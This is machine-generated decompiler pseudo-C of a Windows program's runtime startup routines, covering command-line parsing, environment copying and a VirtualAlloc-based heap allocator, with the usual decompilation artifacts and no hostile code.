				++ebx_109;
			}
			++*dwArg14;
			&edi_121.u0->t0000 = edi_121.u0 + 1;
			byte al_56 = edi_121.u0->t0000;
		} while (al_56 != 0x20 && (al_56 != 0x00 && al_56 != 0x09));
		if (al_56 == 0x00)
			--edi_121;
		else if (ebx_109 != null)
			ebx_109->bFFFFFFFF = 0x00;
	}
	uint32 dwLoc08_411 = 0x00;
	while (true)
	{
		if (edi_121.u0->t0000 != 0x00)
		{
			while (true)
			{
				byte al_139 = edi_121.u0->t0000;
				if (al_139 != 0x20 && al_139 != 0x09)
					break;
				&edi_121.u0->t0000 = edi_121.u0 + 1;
			}
		}
		if (edi_121.u0->t0000 == 0x00)
			break;
		if (edx_153 != null)
		{
			edx_153->u0 = ebx_109;
			edx_153 = (union Eq_1277 *) &edx_153->u1.b0004;
		}
		++*dwArg10;
		while (true)
		{
			uint32 dwLoc14_438 = 0x00;
			while (true)
			{
				byte bLoc14_443 = (byte) dwLoc14_438;
				if (edi_121.u0->t0000 != 0x5C)
					break;
				&edi_121.u0->t0000 = edi_121.u0 + 1;
				++dwLoc14_438;
			}
			uint32 dwLoc14_456;
			word32 dwLoc0C_441 = 0x01;
			dwLoc14_456 = dwLoc14_454;
			if (edi_121.u0->t0000 == 0x22)
			{
				dwLoc0C_441 = 0x01;
				dwLoc14_454 = dwLoc14_438;
				if ((bLoc14_443 & 0x01) == 0x00)
				{
					if (dwLoc08_411 != 0x00)
					{
						if (edi_121.u0[1] == 0x22)
						{
							&edi_121.u0->t0000 = edi_121.u0 + 1;
							dwLoc0C_441 = 0x01;
						}
						else
							dwLoc0C_441 = 0x00;
					}
					else
						dwLoc0C_441 = 0x00;
					dwLoc08_411 = (uint32) (int8) (dwLoc08_411 == 0x00);
				}
				dwLoc14_456 = dwLoc14_438 >> 0x01;
			}
			while (true)
			{
				--dwLoc14_456;
				if (dwLoc14_456 == 0x00)
					break;
				if (ebx_109 != null)
				{
					ebx_109->b0000 = 0x5C;
					++ebx_109;
				}
				++*dwArg14;
			}
			byte al_272 = edi_121.u0->t0000;
			if (al_272 == 0x00 || dwLoc08_411 == 0x00 && (al_272 == 0x20 || al_272 == 0x09))
				break;
			if (dwLoc0C_441 != 0x00)
			{
				if (ebx_109 != null)
				{
					ebx_109->b0000 = edi_121.u0->t0000;
					++ebx_109;
				}
				++*dwArg14;
			}
			&edi_121.u0->t0000 = edi_121.u0 + 1;
		}
		if (ebx_109 != null)
		{
			ebx_109->b0000 = 0x00;
			++ebx_109;
		}
		++*dwArg14;
	}
	if (edx_153 != null)
		edx_153->u0 = 0x00;
	++*dwArg10;
}

// 00402A70: void fn00402A70()
// Called from:
//      Win32CrtStartup
void fn00402A70()
{
	Eq_1856 tLoc0110;
	Eq_1857 tLoc0C;
	Eq_1858 tLoc08;
	Eq_536 eax_15 = GetCommandLineA();
	Eq_536 ebx_16 = eax_15;
	if (eax_15.u0->t0000 == 0x00)
	{
		GetModuleFileNameA(null, &tLoc0110, 0x0104);
		ebx_16 = &tLoc0110;
	}
	fn004028E0(ebx_16, null, null, &tLoc08, &tLoc0C);
	union Eq_1277 * eax_59 = fn004032B0((word32) tLoc0C + tLoc08 * 0x04);
	if (eax_59 != null)
	{
		fn004028E0(ebx_16, eax_59, &eax_59->u0 + tLoc08 * 0x04, &tLoc08, &tLoc0C);
		g_dw405040 = tLoc08 - 0x01;
		g_ptr405044 = eax_59;
	}
	else
		fn004025C0(0x01);
}

// 00402B10: Register Eq_1926 fn00402B10()
// Called from:
//      Win32CrtStartup
Eq_1926 fn00402B10()
{
	Eq_1926 edx;
	Eq_1926 eax_18 = GetEnvironmentStrings();
	Eq_1926 ebx_19 = eax_18;
	if (eax_18 == null)
		ebx_19 = g_t405114;
	Eq_1926 esi_26 = ebx_19;
	word32 ecx_173 = 0x00;
	while (*esi_26 != 0x00)
	{
		edx = esi_26;
		Eq_1944 eax_37 = ~0x00;
		do
			eax_37.u0 = (word32) eax_37 + 1;
		while (Mem32[esi_26 + eax_37:byte] != 0x00);
		if (*esi_26 != 0x3D)
			ecx_173 += eax_37 + 0x01;
		esi_26 += eax_37 + 0x01;
	}
	union Eq_1277 * eax_71 = fn004032B0(ecx_173 + 1);
	g_ptr40504C = eax_71;
	union Eq_1277 * edi_114 = eax_71;
	if (g_ptr40504C != null)
	{
		Eq_1926 esi_146 = ebx_19;
		while (*esi_146 != 0x00)
		{
			edx = esi_146;
			Eq_1982 eax_100 = ~0x00;
			do
				eax_100.u0 = (word32) eax_100 + 1;
			while (Mem91[esi_146 + eax_100:byte] != 0x00);
			if (*esi_146 != 0x3D)
			{
				edx = esi_146;
				int32 ecx_121 = edi_114 - esi_146;
				do
				{
					byte al_125 = *edx;
					edx[ecx_121] = al_125;
					++edx;
				} while (al_125 != 0x00);
				edi_114 += eax_100 + 0x01;
			}
			esi_146 += eax_100 + 0x01;
		}
		*edi_114 = (union Eq_1277 *) 0x00;
		if (ebx_19 != g_t405114)
			FreeEnvironmentStringsA(ebx_19);
		return edx;
	}
	else
		fn004025C0(0x01);
}

// 00402BD0: Register Eq_536 fn00402BD0()
// Called from:
//      Win32CrtStartup
Eq_536 fn00402BD0()
{
	Eq_536 eax_4 = GetCommandLineA();
	Eq_536 edx_13 = eax_4;
	if (eax_4.u0->t0000 == 0x22)
	{
		do
			++edx_13;
		while (edx_13.u0->t0000 != 0x22 && (edx_13.u0)->t0000 != 0x00);
		if (edx_13.u0->t0000 == 0x22)
			++edx_13;
	}
	else
	{
		while (edx_13.u0->t0000 > 0x20)
			++edx_13;
	}
	while (true)
	{
		cu8 al_31 = edx_13.u0->t0000;
		if (al_31 == 0x00 || al_31 > 0x20)
			break;
		++edx_13;
	}
	return edx_13;
}

// 00402C10: void fn00402C10(Stack Eq_1105 dwArg04)
// Called from:
//      Win32CrtStartup
void fn00402C10(Eq_1105 dwArg04)
{
	ptr32 fp;
	ptr32 esp_17 = fp - 4;
	while (g_dw405258 < 0x50)
	{
		uint32 eax_11 = g_dw405258;
		g_dw405258 = eax_11 + 1;
		(*((char *) g_a405118 + eax_11 * 0x04))();
	}
	while (g_dw40525C != 0x00)
	{
		ui32 eax_29 = g_dw40525C;
		g_dw40525C = eax_29 - 0x01;
		(*((char *) g_a405118 + (eax_29 - 0x01) * 0x04))();
	}
	union Eq_1105 * esp_46 = esp_17 - 4;
	esp_46->u0 = (int32) dwArg04;
	fn004025C0(esp_46->u0);
}

// 00402CE0: Register word32 fn00402CE0()
// Called from:
//      Win32CrtStartup
word32 fn00402CE0()
{
	word32 dwArg04;
	return dwArg04;
}

// 00402D60: Register word32 fn00402D60(Stack uint32 dwArg04)
// Called from:
//      fn00402FB0
word32 fn00402D60(uint32 dwArg04)
{
	word32 eax_110;
	uint32 ebx_18 = (dwArg04 + 3 >> 0x0E) + 0x01 << 0x0E;
	struct Eq_2131 * eax_24 = fn004036F0(ebx_18 << 0x02);
	if (eax_24 == null)
	{
		g_t40505C.u0 = 0x00;
		eax_110 = 0x00;
	}
	else
	{
		uint32 esi_47;
		struct Eq_2131 * edi_42;
		if (g_ptr4056A8 + g_dw4056AC / 4 == eax_24)
		{
			esi_47 = (ebx_18 << 0x02) + g_dw4056AC;
			edi_42 = g_ptr4056A8;
			ebx_18 = esi_47 >> 0x02;
		}
		else
		{
			edi_42 = eax_24;
			esi_47 = ebx_18 << 0x02;
		}
		g_ptr4056A8 = edi_42 + ebx_18;
		g_dw4056AC = -(ebx_18 << 0x02) + esi_47;
		if (&g_ptr405284->dw0000 + 1 == edi_42 && g_ptr40528C != null)
		{
			uint32 * edi_70 = (char *) edi_42 - 4;
			uint32 eax_73 = (*edi_70 & 0x7FFFFFFF) + ebx_18;
			*edi_70 = ebx_18 | 0x80000000;
			struct Eq_2169 * edx_78 = g_ptr405284 + ebx_18;
			g_ptr405284 = edx_78;
			edx_78->dwFFFFFFFC = *edi_70;
			g_ptr405284->dw0000 = eax_73 | 0x80000000;
			(g_ptr405284 - (eax_73 << 0x02))->dw0004 = eax_73 | 0x80000000;
			fn00403610(edi_70 + 1);
			eax_110 = 0x01;
		}
		else
		{
			struct Eq_2131 * eax_112 = g_ptr40528C;
			g_ptr40528C = edi_42;
			edi_42->ptr0000 = eax_112;
			struct Eq_2169 * edi_116 = (char *) &edi_42->ptr0000 + 4;
			g_ptr405284 = edi_116;
			uint32 ebx_118 = ebx_18 - 0x01;
			struct Eq_2169 * eax_120 = g_ptr405288;
			if (eax_120 == null || eax_120 > edi_116)
				g_ptr405288 = edi_116;
			int32 eax_153;
			edi_116->dw0000 = ebx_118 | 0x80000000;
			struct Eq_2169 * eax_136 = g_ptr405284 - 4 + ebx_118 * 0x04;
			g_ptr405284 = eax_136;
			eax_136->dw0000 = ebx_118 | 0x80000000;
			struct Eq_2169 * eax_142 = g_ptr405284;
			if (ebx_118 - 0x02 <= g_dw40529C)
			{
				if (ebx_118 - 0x02 <= g_dw405294)
					eax_153 = (word32) (ebx_118 - 0x02 > g_dw405290);
				else if (ebx_118 - 0x02 <= g_dw405298)
					eax_153 = 0x02;
				else
					eax_153 = 0x03;
			}
			else if (ebx_118 - 0x02 <= g_dw4052A4)
				eax_153 = ((word32) (ebx_118 - 0x02 <= g_dw4052A0) - 0x01 & 0x01) + 0x04;
			else if (ebx_118 - 0x02 <= g_dw4052A8)
				eax_153 = 0x06;
			else
				eax_153 = 0x07;
			struct Eq_2304 * edx_186;
			g_dw4052B4 = eax_153;
			struct Eq_2307 * eax_181 = *((char *) g_a405260 + eax_153 * 0x04);
			if (eax_181 == null)
			{
				*((char *) g_a405260 + g_dw4052B4 * 0x04) = eax_142 - 4;
				edx_186 = eax_142 - 4;
				eax_181 = eax_142 - 4;
				if (g_dw4052B0 > g_dw4052B4)
					g_dw4052B0 = g_dw4052B4;
			}
			else
				edx_186 = eax_181->ptrFFFFFFF8;
			eax_142->ptrFFFFFFF8 = eax_181;
			eax_181->ptrFFFFFFF8 = eax_142 - 4;
			edx_186->ptrFFFFFFFC = eax_142 - 4;
			eax_142->ptrFFFFFFF4 = edx_186;
			(-(ebx_118 - 0x02 << 0x02) + (eax_142 - 4))->dw0004 = ebx_118 - 0x02;
			eax_142->dwFFFFFFFC = ebx_118 - 0x02;
			*((char *) g_a405260 + g_dw4052B4 * 0x04) = eax_142 - 4;
			while (true)
			{
				int32 eax_218 = g_dw4052B0;
				if (*((char *) g_a405260 + eax_218 * 0x04) != 0x00 || eax_218 >= 0x07)
					break;
				++g_dw4052B0;
			}
			eax_110 = 0x01;
		}
	}
	return eax_110;
}

// 00402FB0: Register ptr32 fn00402FB0(Stack Eq_1072 dwArg04)
// Called from:
//      fn004032B0
ptr32 fn00402FB0(Eq_1072 dwArg04)
{
	uint32 edx_20 = (word32) dwArg04 + 3 >> 0x02;
	uint32 ebx_188 = edx_20 + 2;
	if (edx_20 < 0x02)
		ebx_188 = 0x04;
	int32 eax_36;
	if (ebx_188 <= g_dw40529C)
	{
		if (ebx_188 <= g_dw405294)
			eax_36 = (word32) (ebx_188 > g_dw405290);
		else if (ebx_188 <= g_dw405298)
			eax_36 = 0x02;
		else
			eax_36 = 0x03;
	}
	else if (ebx_188 <= g_dw4052A4)
		eax_36 = ((word32) (ebx_188 <= g_dw4052A0) - 0x01 & 0x01) + 0x04;
	else if (ebx_188 <= g_dw4052A8)
		eax_36 = 0x06;
	else
		eax_36 = 0x07;
	int32 esi_123 = eax_36;
	struct Eq_2422 * edi_100 = null;
	uint32 dwLoc08_365 = 0x00;
	if (eax_36 < g_dw4052B0)
	{
		esi_123 = g_dw4052B0;
		dwLoc08_365 = 0x00;
		edi_100 = null;
	}
	while (dwLoc08_365 < ebx_188 && esi_123 < 0x08)
	{
		struct Eq_2422 * eax_87 = *((char *) g_a405260 + esi_123 * 0x04);
		++esi_123;
		edi_100 = eax_87;
		if (eax_87 != null)
		{
			if (&g_ptr405284->dwFFFFFFFC == eax_87)
				edi_100 = eax_87->ptrFFFFFFFC;
			do
			{
				uint32 edx_102 = edi_100->dw0000;
				dwLoc08_365 = edx_102;
				if (edx_102 >= ebx_188)
					break;
				edi_100 = edi_100->ptrFFFFFFFC;
			} while (edi_100 != edi_100);
		}
	}
	ptr32 eax_134;
	if (dwLoc08_365 < ebx_188)
	{
		eax_134 = fn00402D60(ebx_188);
		if (eax_134 == 0x00)
			return eax_134;
		esi_123 = g_dw4052B4;
		edi_100 = (struct Eq_2422 *) *((char *) g_a405260 + esi_123 * 0x04);
		dwLoc08_365 = edi_100->dw0000;
	}
	else if (esi_123 > 0x00)
		--esi_123;
	uint32 eax_156 = dwLoc08_365 - ebx_188;
	if (eax_156 >= 0x04)
	{
		int32 dwLoc0C_375;
		if (eax_156 <= g_dw40529C)
		{
			int32 edx_216;
			if (eax_156 <= g_dw405294)
				edx_216 = (word32) (eax_156 > g_dw405290);
			else if (eax_156 <= g_dw405298)
				edx_216 = 0x02;
			else
				edx_216 = 0x03;
			dwLoc0C_375 = edx_216;
		}
		else if (eax_156 <= g_dw4052A4)
			dwLoc0C_375 = ((word32) (eax_156 <= g_dw4052A0) - 0x01 & 0x01) + 0x04;
		else if (eax_156 <= g_dw4052A8)
			dwLoc0C_375 = 0x06;
		else
			dwLoc0C_375 = 0x07;
		if (dwLoc0C_375 != esi_123)
		{
			struct Eq_2422 * edx_245 = edi_100->ptrFFFFFFFC;
			if (edi_100 == edx_245)
			{
				*((char *) g_a405260 + esi_123 * 0x04) = 0x00;
				if (g_dw4052B0 == esi_123)
				{
					while (true)
					{
						int32 ecx_258 = g_dw4052B0;
						if (*((char *) g_a405260 + ecx_258 * 0x04) != 0x00 || ecx_258 >= 0x07)
							break;
						++g_dw4052B0;
					}
				}
			}
			else
			{
				struct Eq_2422 * ecx_248 = edi_100->ptrFFFFFFF8;
				ecx_248->ptrFFFFFFFC = edx_245;
				edx_245->ptrFFFFFFF8 = ecx_248;
				if (*((char *) g_a405260 + esi_123 * 0x04) == edi_100)
					*((char *) g_a405260 + esi_123 * 0x04) = (struct Eq_2307 **) ecx_248;
			}
			struct Eq_2422 * dwLoc18_384;
			struct Eq_2422 * edx_271 = *((char *) g_a405260 + dwLoc0C_375 * 0x04);
			if (edx_271 == null)
			{
				*((char *) g_a405260 + dwLoc0C_375 * 0x04) = (struct Eq_2307 **) edi_100;
				dwLoc18_384 = edi_100;
				edx_271 = edi_100;
				if (g_dw4052B0 > dwLoc0C_375)
					g_dw4052B0 = dwLoc0C_375;
			}
			else
				dwLoc18_384 = edx_271->ptrFFFFFFF8;
			edi_100->ptrFFFFFFFC = edx_271;
			edx_271->ptrFFFFFFF8 = edi_100;
			dwLoc18_384->ptrFFFFFFFC = edi_100;
			edi_100->ptrFFFFFFF8 = dwLoc18_384;
			(&(edi_100 + -(eax_156 << 0x02) / 4)->dw0000)[1] = eax_156;
			edi_100->dw0000 = eax_156;
		}
		else
		{
			(&(edi_100 + -(eax_156 << 0x02) / 4)->dw0000)[1] = eax_156;
			edi_100->dw0000 = eax_156;
		}
	}
	else
	{
		struct Eq_2422 * eax_162 = edi_100->ptrFFFFFFFC;
		if (edi_100 == eax_162)
		{
			*((char *) g_a405260 + esi_123 * 0x04) = 0x00;
			if (g_dw4052B0 == esi_123)
			{
				while (true)
				{
					int32 edx_176 = g_dw4052B0;
					if (*((char *) g_a405260 + edx_176 * 0x04) != 0x00 || edx_176 >= 0x07)
						break;
					++g_dw4052B0;
				}
			}
		}
		else
		{
			struct Eq_2422 * edx_165 = edi_100->ptrFFFFFFF8;
			edx_165->ptrFFFFFFFC = eax_162;
			eax_162->ptrFFFFFFF8 = edx_165;
			if (*((char *) g_a405260 + esi_123 * 0x04) == edi_100)
				*((char *) g_a405260 + esi_123 * 0x04) = (struct Eq_2307 **) edx_165;
		}
		ebx_188 = dwLoc08_365;
	}
	struct Eq_2578 * eax_317 = edi_100 + -(dwLoc08_365 * 0x04) / 4;
	ui32 eax_326 = ebx_188 | 0x80000000;
	eax_317[ebx_188 * 0x04 / 8] = (struct Eq_2578) eax_326;
	eax_317->dw0004 = eax_326;
	eax_134 = &eax_317->dw0004 + 1;
	return eax_134;
}

// 004032B0: Register word32 fn004032B0(Stack Eq_1072 dwArg04)
// Called from:
//      fn00402690
//      fn00402A70
//      fn00402B10
word32 fn004032B0(Eq_1072 dwArg04)
{
	word32 esi_11 = 0x00;
	if (dwArg04 < g_t40505C.u0)
		esi_11 = fn00402FB0(dwArg04);
	if (esi_11 == 0x00)
		esi_11 = fn00402520(dwArg04);
	if (esi_11 == 0x00)
		g_dw4052BC = 0x0C;
	return esi_11;
}

// 004032F0: void fn004032F0(Stack Eq_1072 dwArg04)
// Called from:
//      fn00403610
void fn004032F0(Eq_1072 dwArg04)
{
	if ((*((word32) dwArg04 - 4) & 0x80000000) == 0x00)
		g_dw4052BC = 22;
	else
	{
		ui32 eax_25 = *((word32) dwArg04 - 4);
		uint32 eax_103 = eax_25 & 0x7FFFFFFF;
		struct Eq_2703 * edx_177 = dwArg04 - 0x08 + (eax_25 & 0x7FFFFFFF) * 0x04;
		int32 dwLoc08_342 = ~0x00;
		if ((edx_177->dw0004 & 0x80000000) == 0x00)
		{
			int32 dwLoc0C_343;
			struct Eq_2703 * esi_38 = edx_177 + (edx_177->dw0004 * 0x04) / 8;
			if (esi_38->dw0000 <= g_dw40529C)
			{
				int32 ecx_67;
				if (esi_38->dw0000 <= g_dw405294)
					ecx_67 = (word32) (esi_38->dw0000 > g_dw405290);
				else if (esi_38->dw0000 <= g_dw405298)
					ecx_67 = 0x02;
				else
					ecx_67 = 0x03;
				dwLoc0C_343 = ecx_67;
			}
			else if (esi_38->dw0000 <= g_dw4052A4)
				dwLoc0C_343 = ((word32) (esi_38->dw0000 <= g_dw4052A0) - 0x01 & 0x01) + 0x04;
			else if (esi_38->dw0000 <= g_dw4052A8)
				dwLoc0C_343 = 0x06;
			else
				dwLoc0C_343 = 0x07;
			eax_103 = (eax_25 & 0x7FFFFFFF) + esi_38->dw0000;
			esi_38->dw0000 = eax_103;
			(esi_38 + -(eax_103 << 0x02) / 8)->dw0004 = eax_103;
			dwLoc08_342 = dwLoc0C_343;
			edx_177 = esi_38;
		}
		if ((*((word32) dwArg04 - 8) & 0x80000000) == 0x00)
		{
			int32 esi_114;
			eax_103 = (char *) ((word32) dwArg04 - 8)->u0 + eax_103;
			if (*((word32) dwArg04 - 8) <= g_dw40529C)
			{
				int32 ecx_133;
				if (*((word32) dwArg04 - 8) <= g_dw405294)
					ecx_133 = (word32) (*((word32) dwArg04 - 8) > g_dw405290);
				else if (*((word32) dwArg04 - 8) <= g_dw405298)
					ecx_133 = 0x02;
				else
					ecx_133 = 0x03;
				esi_114 = ecx_133;
			}
			else if (*((word32) dwArg04 - 8) <= g_dw4052A4)
				esi_114 = ((word32) (*((word32) dwArg04 - 8) <= g_dw4052A0) - 0x01 & 0x01) + 0x04;
			else if (*((word32) dwArg04 - 8) <= g_dw4052A8)
				esi_114 = 0x06;
			else
				esi_114 = 0x07;
			struct Eq_2833 * ecx_149 = *((word32) dwArg04 - 0x0C);
			if (dwArg04 - 0x08 == ecx_149)
			{
				*((char *) g_a405260 + esi_114 * 0x04) = 0x00;
				if (g_dw4052B0 == esi_114)
				{
					while (true)
					{
						int32 esi_162 = g_dw4052B0;
						if (*((char *) g_a405260 + esi_162 * 0x04) != 0x00 || esi_162 >= 0x07)
							break;
						++g_dw4052B0;
					}
				}
			}
			else
			{
				struct Eq_2859 * esi_152 = *((word32) dwArg04 - 16);
				esi_152->ptrFFFFFFFC = ecx_149;
				ecx_149->ptrFFFFFFF8 = esi_152;
				if (*((char *) g_a405260 + esi_114 * 0x04) == dwArg04 - 0x08)
					*((char *) g_a405260 + esi_114 * 0x04) = (struct Eq_2307 **) esi_152;
			}
			edx_177->dw0000 = eax_103;
			(edx_177 + -(eax_103 << 0x02) / 8)->dw0004 = eax_103;
		}
		int32 ebx_197;
		if (eax_103 <= g_dw40529C)
		{
			int32 ecx_216;
			if (eax_103 <= g_dw405294)
				ecx_216 = (word32) (eax_103 > g_dw405290);
			else if (eax_103 <= g_dw405298)
				ecx_216 = 0x02;
			else
				ecx_216 = 0x03;
			ebx_197 = ecx_216;
		}
		else if (eax_103 <= g_dw4052A4)
			ebx_197 = ((word32) (eax_103 <= g_dw4052A0) - 0x01 & 0x01) + 0x04;
		else if (eax_103 <= g_dw4052A8)
			ebx_197 = 0x06;
		else
			ebx_197 = 0x07;
		if (dwLoc08_342 != ebx_197)
		{
			if (dwLoc08_342 >= 0x00)
			{
				struct Eq_2703 * ecx_245 = edx_177->ptrFFFFFFFC;
				if (edx_177 == ecx_245)
				{
					*((char *) g_a405260 + dwLoc08_342 * 0x04) = 0x00;
					if (g_dw4052B0 == dwLoc08_342)
					{
						while (true)
						{
							int32 ebx_262 = g_dw4052B0;
							if (*((char *) g_a405260 + ebx_262 * 0x04) != 0x00 || ebx_262 >= 0x07)
								break;
							++g_dw4052B0;
						}
					}
				}
				else
				{
					struct Eq_2703 * ebx_248 = edx_177->ptrFFFFFFF8;
					ebx_248->ptrFFFFFFFC = ecx_245;
					ecx_245->ptrFFFFFFF8 = ebx_248;
					if (*((char *) g_a405260 + dwLoc08_342 * 0x04) == edx_177)
						*((char *) g_a405260 + dwLoc08_342 * 0x04) = (struct Eq_2307 **) ebx_248;
				}
			}
			struct Eq_2703 * ebx_278;
			struct Eq_2703 * ecx_273 = *((char *) g_a405260 + ebx_197 * 0x04);
			if (ecx_273 == null)
			{
				*((char *) g_a405260 + ebx_197 * 0x04) = (struct Eq_2307 **) edx_177;
				ebx_278 = edx_177;
				ecx_273 = edx_177;
				if (g_dw4052B0 > ebx_197)
					g_dw4052B0 = ebx_197;
			}
			else
				ebx_278 = ecx_273->ptrFFFFFFF8;
			edx_177->ptrFFFFFFFC = ecx_273;
			ecx_273->ptrFFFFFFF8 = edx_177;
			ebx_278->ptrFFFFFFFC = edx_177;
			edx_177->ptrFFFFFFF8 = ebx_278;
			(edx_177 + -(eax_103 << 0x02) / 8)->dw0004 = eax_103;
			edx_177->dw0000 = eax_103;
			g_dw4052B4 = ebx_197;
			*((char *) g_a405260 + ebx_197 * 0x04) = (struct Eq_2307 **) edx_177;
		}
	}
}

// 00403610: void fn00403610(Stack Eq_1072 dwArg04)
// Called from:
//      fn00402D60
void fn00403610(Eq_1072 dwArg04)
{
	if (dwArg04 != 0x00)
	{
		if (dwArg04 - 4 > g_ptr405288 && dwArg04 - 4 < g_ptr405284)
			fn004032F0(dwArg04);
		else
			fn00402560(dwArg04);
	}
}

// 004036F0: Register Eq_1072 fn004036F0(Stack Eq_1072 dwArg04)
// Called from:
//      fn00402D60
Eq_1072 fn004036F0(Eq_1072 dwArg04)
{
	Eq_3047 tLoc20;
	Eq_1072 eax_122;
	if (g_t405054.u0 == 0x00)
	{
		eax_122 = VirtualAlloc(0x00, g_t405058.u0, 0x2000, 0x01);
		g_t405054.u0 = (LPCVOID) eax_122;
		if (eax_122 == 0x00)
			return eax_122;
	}
	eax_122 = VirtualQuery(g_t405054.u0, &tLoc20, 0x1C);
	if (eax_122 != 0x00)
	{
		Eq_1072 eax_52;
		if (tLoc20.State == 0x1000)
			eax_52.u0 = (char *) g_t405054.u0 + tLoc20.RegionSize;
		else
			eax_52.u0 = g_t405054.u0;
		if (dwArg04 + eax_52 >=u Mem43[0x00405058<p32>:word32] + Mem43[0x00405054<p32>:word32])
			eax_122.u0 = 0x00;
		else
		{
			eax_122 = VirtualAlloc(eax_52, dwArg04, 0x1000, 0x04);
			if (eax_122 != 0x00)
				eax_122 = eax_52;
		}
	}
	return eax_122;
}

